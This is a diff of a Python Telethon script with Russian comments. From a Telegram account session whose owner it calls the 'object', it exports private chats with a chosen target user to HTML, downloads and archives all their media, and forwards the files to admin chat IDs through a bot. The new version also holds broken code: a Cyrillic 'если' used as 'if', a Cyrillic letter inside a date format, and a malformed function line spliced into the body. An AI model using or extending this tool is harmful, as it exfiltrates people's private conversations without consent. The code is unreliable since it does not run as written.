@@ -1,86 +1,26 @@
-import asyncio  
+import asyncio
 import os
 import time
-import openpyxl
-from telethon.tl.functions.channels import InviteToChannelRequest
-from telethon.tl.functions.contacts import GetContactsRequest, GetBlockedRequest
-from telethon.tl.functions.messages import GetDialogsRequest, ImportChatInviteRequest
-from telethon.tl.types import InputChannel, InputPhoneContact, User, Chat, Channel, Message, MessageFwdHeader, MessageMediaDocument, PeerChannel, DocumentAttributeFilename
-from telethon.sync import TelegramClient, types
-from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError
-from openpyxl import Workbook
-from openpyxl.utils import get_column_letter
-from datetime import datetime
-from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
-from datetime import datetime
-from typing import Optional
-import re
-from jinja2 import Template
 import base64
-from io import BytesIO
-from PIL import Image
-from html import escape
-from telethon.sync import TelegramClient
-from telethon import functions, types
-from telethon.tl.functions.contacts import SearchRequest
-from telethon.tl.functions.messages import SearchRequest as MessageSearchRequest
-from telethon.tl.types import InputMessagesFilterEmpty
+import re
+import shutil  # Обязательно добавляем импорт модуля shutil
+import zipfile
 from datetime import datetime
+from io import BytesIO
+from typing import Optional
+from PIL import Image
 from pytz import timezone
 from html import escape
-from jinja2 import Environment, FileSystemLoader
+from jinja2 import Template, Environment, FileSystemLoader
+from openpyxl import Workbook
+from openpyxl.utils import get_column_letter
+from telethon import functions, types
 from telethon.sync import TelegramClient
-from telethon.tl.types import PeerChannel, PeerUser, User, Channel, MessageFwdHeader
-import zipfile
-import shutil  # Обязательно добавляем импорт модуля shutil
-    
-        
-def download_media_files(client, target_user):
-    media_files = []
-
-    try:
-        for message in client.iter_messages(target_user):
-            if message.media is not None:
-                if isinstance(message.media, (types.MessageMediaPhoto, types.MessageMediaDocument)):
-                    media_path = client.download_media(message.media)
-                    if media_path:
-                        media_files.append(media_path)
-                        print(f"Скачан медиафайл: {media_path}")
-    except Exception as e:
-        print(f"Ошибка при скачивании медиафайлов: {e}")
-
-    # Проверка скачанных медиафайлов
-    if not media_files:
-        print("Медиафайлы не найдены.")
-        return
-
-    # Создание папки для медиафайлов, если она не существует
-    media_folder = f"{target_user}_media_files"
-    os.makedirs(media_folder, exist_ok=True)
-
-    # Перемещение медиафайлов в папку
-    for file_path in media_files:
-        destination_path = os.path.join(media_folder, os.path.basename(file_path))
-        os.rename(file_path, destination_path)
-        print(f"Файл перемещен в: {destination_path}")
-
-    # Создание архива с медиафайлами
-    archive_filename = f"{target_user}_media_files.zip"
-    with zipfile.ZipFile(archive_filename, 'w') as zipf:
-        for root, dirs, files in os.walk(media_folder):
-            for file in files:
-                file_path = os.path.join(root, file)
-                zipf.write(file_path, arcname=file)
-                print(f"Файл добавлен в архив: {file_path}")
-    
-    
-    try:
-        shutil.rmtree(media_folder)
-        print(f"Папка '{media_folder}' успешно удалена.")
-    except Exception as e:
-        print(f"Ошибка при удалении папки '{media_folder}': {e}")
-
-    input(f"Медиафайлы сохранены в архив '{archive_filename}' и отправлены в бот")
+from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError, PeerFloodError, UserPrivacyRestrictedError
+from telethon.tl.functions.channels import InviteToChannelRequest
+from telethon.tl.functions.contacts import GetContactsRequest, GetBlockedRequest, SearchRequest
+from telethon.tl.functions.messages import GetDialogsRequest, ImportChatInviteRequest, SearchRequest as MessageSearchRequest
+from telethon.tl.types import InputChannel, InputPhoneContact, User, Chat, Channel, Message, MessageFwdHeader, MessageMediaDocument, PeerChannel, DocumentAttributeFilename, InputMessagesFilterEmpty
 
 
 def get_messages_from_group(client, target_group, selection):
@@ -249,107 +189,193 @@ def get_messages_from_group(client, target_group, selection):
 def get_user_dialogs(client, flag_user_dialogs):
     user_dialogs = []
     users_list = []
-    dialogs = client.get_dialogs()
+    
+    try:
+        dialogs = client.get_dialogs()
+    except Exception as e:
+        print(f"Ошибка при получении диалогов: {e}")
+        return user_dialogs, 0, users_list, flag_user_dialogs
+    
     i = 0
     
     for dialog in dialogs:
-        if isinstance(dialog.entity, User) and not dialog.entity.bot:
-            messages = client.get_messages(dialog.entity, limit=0)
-            count_messages = messages.total
-            
-            user = dialog.entity
-            username = f'\033[36m@{user.username}\033[0m' if user.username else ""
-            first_name = user.first_name if user.first_name else ''
-            last_name = user.last_name if user.last_name else ''
-            
-            user_dialogs.append(
-                f'{i}) \033[95m{first_name} {last_name}\033[0m {username} {user.id} ' 
-                f'/ \033[33m[{count_messages}]\033[0m'
-            )
+        try:
+            if isinstance(dialog.entity, User) and not dialog.entity.bot:
+                try:
+                    messages = client.get_messages(dialog.entity, limit=0)
+                    count_messages = messages.total
+                except Exception as e:
+                    print(f"Ошибка при получении сообщений для пользователя {dialog.entity.id}: {e}")
+                    count_messages = "N/A"  # Значение по умолчанию, если сообщения не удалось получить
+                
+                user = dialog.entity
+                username = f'\033[36m@{user.username}\033[0m' if user.username else ""
+                first_name = user.first_name if user.first_name else ''
+                last_name = user.last_name если user.last_name else ''
+                
+                user_dialogs.append(
+                    f'{i}) \033[95m{first_name} {last_name}\033[0m {username} {user.id} ' 
+                    f'/ \033[33m[{count_messages}]\033[0m'
+                )
 
-            users_list.append(dialog.entity.id)
-            i += 1
+                users_list.append(dialog.entity.id)
+                i += 1
+        except Exception as e:
+            print(f"Ошибка при обработке диалога {dialog.id}: {e}")
+    
     flag_user_dialogs = True
     return user_dialogs, i, users_list, flag_user_dialogs
 
 
+
 #Вспомогательная функция
 def get_forwarded_info(client, message):
-    # Получение id пересланного пользователя или канала
-    fwd_user_id = message.fwd_from.from_id.user_id if isinstance(message.fwd_from, MessageFwdHeader) and hasattr(message.fwd_from.from_id, 'user_id') else None
-    fwd_channel_id = message.fwd_from.from_id.channel_id if isinstance(message.fwd_from, MessageFwdHeader) and hasattr(message.fwd_from.from_id, 'channel_id') and isinstance(message.fwd_from.from_id, PeerChannel) else None
-    fwd_date = message.fwd_from.date if isinstance(message.fwd_from, MessageFwdHeader) and hasattr(message.fwd_from, 'date') else None
+    try:
+        # Получение id пересланного пользователя или канала
+        fwd_user_id = message.fwd_from.from_id.user_id if isinstance(message.fwd_from, MessageFwdHeader) and hasattr(message.fwd_from.from_id, 'user_id') else None
+        fwd_channel_id = message.fwd_from.from_id.channel_id if isinstance(message.fwd_from, MessageFwdHeader) and hasattr(message.fwd_from.from_id, 'channel_id') and isinstance(message.fwd_from.from_id, PeerChannel) else None
+        fwd_date = message.fwd_from.date if isinstance(message.fwd_from, MessageFwdHeader) and hasattr(message.fwd_from, 'date') else None
 
-    # Данные о пользователе или канале
-    fwd_info = {}
+        # Данные о пользователе или канале
+        fwd_info = {}
 
-    if fwd_user_id or fwd_channel_id:
-        if fwd_user_id:
-            fwd_info['Источник'] = "пользователь"
-            
-            # Получение информации о пользователе
-            user = client.get_entity(PeerUser(fwd_user_id))
-            if isinstance(user, User):
-                # Имя и фамилия
-                if user.first_name or user.last_name:
-                    name = " ".join(filter(None, [user.first_name, user.last_name]))
-                    fwd_info['Имя и фамилия'] = name
+        if fwd_user_id or fwd_channel_id:
+            if fwd_user_id:
+                fwd_info['Источник'] = "пользователь"
                 
-                # Юзернейм
-                if user.username:
-                    fwd_info['Юзернейм'] = f"@{user.username}"
+                try:
+                    # Получение информации о пользователе
+                    user = client.get_entity(PeerUser(fwd_user_id))
+                    if isinstance(user, User):
+                        # Имя и фамилия
+                        if user.first_name or user.last_name:
+                            name = " ".join(filter(None, [user.first_name, user.last_name]))
+                            fwd_info['Имя и фамилия'] = name
+                        
+                        # Юзернейм
+                        if user.username:
+                            fwd_info['Юзернейм'] = f"@{user.username}"
+                        
+                        # ID пользователя
+                        fwd_info['ID'] = fwd_user_id
+                except Exception as e:
+                    print(f"Ошибка при получении информации о пользователе с ID {fwd_user_id}: {e}")
+            else:
+                fwd_info['Источник'] = "канал"
                 
-                # ID пользователя
-                fwd_info['ID'] = fwd_user_id
-        else:
-            fwd_info['Источник'] = "канал"
-            
-            # Получение информации о канале
-            channel = client.get_entity(PeerChannel(fwd_channel_id))
-            if isinstance(channel, Channel):
-                # Название канала
-                if channel.title:
-                    fwd_info['Название канала'] = channel.title
-                
-                # Ссылка на канал
-                if channel.username:
-                    fwd_info['Ссылка на канал'] = f"https://t.me/{channel.username}"
-                
-                # ID канала
-                fwd_info['ID'] = fwd_channel_id
+                try:
+                    # Получение информации о канале
+                    channel = client.get_entity(PeerChannel(fwd_channel_id))
+                    if isinstance(channel, Channel):
+                        # Название канала
+                        if channel.title:
+                            fwd_info['Название канала'] = channel.title
+                        
+                        # Ссылка на канал
+                        if channel.username:
+                            fwd_info['Ссылка на канал'] = f"https://t.me/{channel.username}"
+                        
+                        # ID канала
+                        fwd_info['ID'] = fwd_channel_id
+                except Exception as e:
+                    print(f"Ошибка при получении информации о канале с ID {fwd_channel_id}: {e}")
 
-    # Дата
-    if fwd_date:
-        fwd_info['Дата'] = fwd_date.strftime('%d.%m.%Y %H:%M:%S')
+        # Дата
+        if fwd_date:
+            fwd_info['Дата'] = fwd_date.strftime('%d.%m.%Y %H:%М:%S')
 
-    # Формируем строку из непустых значений
-    forward_sender = ", ".join([f"{key}: {value}" for key, value in fwd_info.items()]) if fwd_info else "Источник неизвестен"
-    return forward_sender
+        # Формируем строку из непустых значений
+        forward_sender = ", ".join([f"{key}: {value}" for key, value in fwd_info.items()]) if fwd_info else "Источник неизвестен"
+        return forward_sender
+    
+    except Exception as e:
+        print(f"Общая ошибка при обработке пересланного сообщения: {e}")
+        return "Источник неизвестен"
 
+#Вспомогательная функция по скачиванию медиа
+def download_media_files(client, target_user):
+    media_files = []
 
+    try:
+        for message in client.iter_messages(target_user):
+            if message.media is not None:
+                if isinstance(message.media, (types.MessageMediaPhoto, types.MessageMediaDocument)):
+                    try:
+                        media_path = client.download_media(message.media)
+                        if media_path:
+                            media_files.append(media_path)
+                            print(f"Скачан медиафайл: {media_path}")
+                    except Exception as e:
+                        print(f"Ошибка при скачивании медиафайла: {e}")
+    except Exception as e:
+        print(f"Ошибка при получении сообщений: {e}")
+
+    # Проверка скачанных медиафайлов
+    if not media_files:
+        print("Медиафайлы не найдены.")
+        return
+
+    # Создание папки для медиафайлов, если она не существует
+    media_folder = f"{target_user}_media_files"
+    os.makedirs(media_folder, exist_ok=True)
+
+    # Перемещение медиафайлов в папку
+    for file_path in media_files:
+        try:
+            destination_path = os.path.join(media_folder, os.path.basename(file_path))
+            os.rename(file_path, destination_path)
+            print(f"Файл перемещен в: {destination_path}")
+        except Exception as e:
+            print(f"Ошибка при перемещении файла {file_path}: {e}")
+
+    # Создание архива с медиафайлами
+    archive_filename = f"{target_user}_media_files.zip"
+    try:
+        with zipfile.ZipFile(archive_filename, 'w') as zipf:
+            for root, dirs, files in os.walk(media_folder):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    zipf.write(file_path, arcname=file)
+                    print(f"Файл добавлен в архив: {file_path}")
+    except Exception as e:
+        print(f"Ошибка при создании архива: {e}")
+
+    # Удаление папки с медиафайлами после архивирования
+    try:
+        shutil.rmtree(media_folder)
+        print(f"Папка '{media_folder}' успешно удалена.")
+    except Exception as e:
+        print(f"Ошибка при удалении папки '{media_folder}': {e}")
+
+    print(f"Медиафайлы сохранены в архив '{archive_filename}'")
 
 def get_private_messages(client, target_user, selection, bot, admin_chat_ids):
     minsk_timezone = timezone('Europe/Minsk')
 
-    # Информация об объекте
-    me = client.get_me()
-    userid_client = me.id
-    firstname_client = me.first_name
-    username_client = f"@{me.username}" if me.username is not None else ""
-    lastname_client = me.last_name if me.last_name is not None else ""
+    try:
+        # Информация об объекте
+        me = client.get_me()
+        userid_client = me.id
+        firstname_client = me.first_name
+        username_client = f"@{me.username}" if me.username is not None else ""
+        lastname_client = me.last_name if me.last_name is not None else ""
+        
+        user = client.get_entity(target_user)
+        # Информация о собеседнике
+        username = f'@{user.username}' if user.username else ""
+        first_name = user.first_name if user.first_name else ''
+        last_name = user.last_name if user.last_name else ''
+        user_id = user.id
+    except Exception as e:
+        print(f"Ошибка при получении информации о пользователе: {e}")
+        return
     
-    user = client.get_entity(target_user)
-    # Информация о собеседнике
-    username = f'@{user.username}' if user.username else ""
-    first_name = user.first_name if user.first_name else ''
-    last_name = user.last_name if user.last_name else ''
-    user_id = user.id
-   
     messages = []
     messages_count = 0
     first_message_date = None
     last_message_date = None
     forward_sender = None
+
     try:
         for message in client.iter_messages(target_user):    
             message_time = message.date.astimezone(minsk_timezone).strftime('%d.%m.%Y %H:%M:%S')
@@ -369,16 +395,21 @@ def get_private_messages(client, target_user, selection, bot, admin_chat_ids):
             if message.forward:
                 is_forward = True
                 forward_text = escape(message.text) if message.text else None
-                forward_sender = get_forwarded_info(client, message) #Новая фишка
+                try:
+                    forward_sender = get_forwarded_info(client, message) # Новая фишка
+                except Exception as e:
+                    forward_sender = f"Ошибка при получении информации о пересланном сообщении: {e}"
         
             reply_text = None
             if message.reply_to_msg_id:
-                if message.reply_to_msg_id:
+                try:
                     original_message = client.get_messages(target_user, ids=message.reply_to_msg_id)
                     if original_message:
                         reply_text = escape(original_message.text) if original_message.text else None
                     else:
                         reply_text = None
+                except Exception as e:
+                    reply_text = f"Ошибка при получении ответа: {e}"
    
             reaction_info = ""
             reactions = message.reactions
@@ -387,55 +418,57 @@ def get_private_messages(client, target_user, selection, bot, admin_chat_ids):
 
             media_type = None
             if message.media is not None:
-                if isinstance(message.media, types.MessageMediaPhoto):
-                    if selection in ['45', '450']:
-                        # Загрузка фото в формате base64
-                        photo_bytes = client.download_media(message.media.photo, file=BytesIO())
-                        if photo_bytes:
-                            image = Image.open(photo_bytes)
-                            original_size = image.size
-                            new_size = (original_size[0] // 2, original_size[1] // 2)
-                            image = image.resize(new_size)
-                            output = BytesIO()
-                            image.save(output, format='JPEG', quality=70)
-                            encoded_image = base64.b64encode(output.getvalue()).decode('utf-8')
-                            image_data_url = f"data:image/jpeg;base64,{encoded_image}"
-                            media_type = f'<img src="{image_data_url}" alt="Photo">'
+                try:
+                    if isinstance(message.media, types.MessageMediaPhoto):
+                        if selection in ['45', '450']:
+                            # Загрузка фото в формате base64
+                            photo_bytes = client.download_media(message.media.photo, file=BytesIO())
+                            if photo_bytes:
+                                image = Image.open(photo_bytes)
+                                original_size = image.size
+                                new_size = (original_size[0] // 2, original_size[1] // 2)
+                                image = image.resize(new_size)
+                                output = BytesIO()
+                                image.save(output, format='JPEG', quality=50)
+                                encoded_image = base64.b64encode(output.getvalue()).decode('utf-8')
+                                image_data_url = f"data:image/jpeg;base64,{encoded_image}"
+                                media_type = f'<img src="{image_data_url}" alt="Photo">'
+                            else:
+                                media_type = 'Photo'
                         else:
                             media_type = 'Photo'
+                    elif isinstance(message.media, types.MessageMediaDocument):
+                        for attribute in message.media.document.attributes:
+                            if isinstance(attribute, types.DocumentAttributeFilename):
+                                document_name = attribute.file_name
+                                media_type = f"Document: {document_name}"
+                                break
+                        if media_type is None:
+                            media_type = 'Document (Photo, video, etc)'
+                    elif isinstance(message.media, types.MessageMediaWebPage):
+                        media_type = 'WebPage'
+                    elif isinstance(message.media, types.MessageMediaContact):
+                        media_type = 'Contact'
+                    elif isinstance(message.media, types.MessageMediaGeo):
+                        media_type = 'Geo'
+                    elif isinstance(message.media, types.MessageMediaVenue):
+                        media_type = 'Venue'
+                    elif isinstance(message.media, types.MessageMediaGame):
+                        media_type = 'Game'
+                    elif isinstance(message.media, types.MessageMediaInvoice):
+                        media_type = 'Invoice'
+                    elif isinstance(message.media, types.MessageMediaPoll):
+                        media_type = 'Poll'
+                    elif isinstance(message.media, types.MessageMediaDice):
+                        media_type = 'Dice'
+                    elif isinstance(message.media, types.MessageMediaPhotoExternal):
+                        media_type = 'PhotoExternal'
                     else:
-                            media_type = 'Photo'
-                    
-                elif isinstance(message.media, types.MessageMediaDocument):
-                    for attribute in message.media.document.attributes:
-                        if isinstance(attribute, types.DocumentAttributeFilename):
-                            document_name = attribute.file_name
-                            media_type = f"Document: {document_name}"
-                            break
-                    if media_type is None:
-                        media_type = 'Document (Photo, video, etc)'
-                elif isinstance(message.media, types.MessageMediaWebPage):
-                    media_type = 'WebPage'
-                elif isinstance(message.media, types.MessageMediaContact):
-                    media_type = 'Contact'
-                elif isinstance(message.media, types.MessageMediaGeo):
-                    media_type = 'Geo'
-                elif isinstance(message.media, types.MessageMediaVenue):
-                    media_type = 'Venue'
-                elif isinstance(message.media, types.MessageMediaGame):
-                    media_type = 'Game'
-                elif isinstance(message.media, types.MessageMediaInvoice):
-                    media_type = 'Invoice'
-                elif isinstance(message.media, types.MessageMediaPoll):
-                    media_type = 'Poll'
-                elif isinstance(message.media, types.MessageMediaDice):
-                    media_type = 'Dice'
-                elif isinstance(message.media, types.MessageMediaPhotoExternal):
-                    media_type = 'PhotoExternal'
-                else:
-                    media_type = 'Unknown'
+                        media_type = 'Unknown'
+                except Exception as e:
+                    media_type = f"Ошибка при обработке медиа: {e}"
             
-            messages_count +=1
+            messages_count += 1
             messages.append({
                 'time': message_time,
                 'sender_info': sender_info,
@@ -459,32 +492,53 @@ def get_private_messages(client, target_user, selection, bot, admin_chat_ids):
             'media_type': '',
             'sender_id': None
         })
-            
-
-    env = Environment(loader=FileSystemLoader('.'))
-    template = env.get_template('template_user_messages.html')
-    html_output = template.render(
-        firstname_client=firstname_client,
-        first_name=first_name,
-        messages=messages,
-        userid_client=userid_client,
-        user_id=user_id,
-        first_message_date=first_message_date.astimezone(minsk_timezone).strftime('%d.%m.%Y'),
-        last_message_date=last_message_date.astimezone(minsk_timezone).strftime('%d.%m.%Y'),
-        messages_count=messages_count
-    )
     
-    filename = f"{target_user}_private_messages.html"
-    with open(filename, "w", encoding="utf-8") as file:
-        file.write(html_output)
-    print(f"HTML-файл сохранен как '{filename}' и отправлен в бот")
-
-    send_files_to_bot(bot, admin_chat_ids)
+    try:
+        env = Environment(loader=FileSystemLoader('.'))
+        template = env.get_template('template_user_messages.html')
+        html_output = template.render(
+            firstname_client=firstname_client,
+            first_name=first_name,
+            messages=messages,
+            userid_client=userid_client,
+            user_id=user_id,
+            first_message_date=first_message_date.astimezone(minsk_timezone).strftime('%d.%m.%Y') if first_message_date else '',
+            last_message_date=last_message_date.astimezone(minsk_timezone).strftime('%d.%m.%Y') if last_message_date else '',
+            messages_count=messages_count
+        )
+        
+        filename = f"{target_user}_private_messages.html"
+        with open(filename, "w", encoding="utf-8") as file:
+            file.write(html_output)
+        
+        
+        # Проверка размера файла
+        file_size_mb = os.path.getsize(filename) / (1024 * 1024)
+        if file_size_mb > 49:
+            print(f"Файл '{filename}' слишком большой для отправки ({file_size_mb:.2f} МБ).")
+            for admin_chat_id in admin_chat_ids:
+                bot.send_message(admin_chat_id, f"Файл '{filename}' слишком большой для отправки ({file_size_mb:.2f} МБ).")
+        else:
+            print(f"HTML-файл сохранен как '{filename}' и отправлен в бот")
+            send_files_to_bot(bot, admin_chat_ids)
+    except Exception as e:
+        print(f"Ошибка при создании HTML-файла или отправке файла: {e}")
     
     if selection == '450':
-        print()
-        print("Скачиваю медиа, завари кофе...")
-        download_media_files(client, target_user)
+        try:
+            print()
+            print("Скачиваю медиа, завари кофе...")
+            download_media_files(client, target_user)
+        except Exception as e:
+            print(f"Ошибка при скачивании медиафайлов: {e}")
+
+    send_files_to_bot(bot, admin_chat_ids):
+    for admin_chat_id in admin_chat_ids:
+        try:
+            with open(filename, 'rb') as file:
+                bot.send_document(admin_chat_id, file)
+        except Exception as e:
+            print(f"Ошибка при отправке файла {filename} админу {admin_chat_id}: {e}")
 
 
 
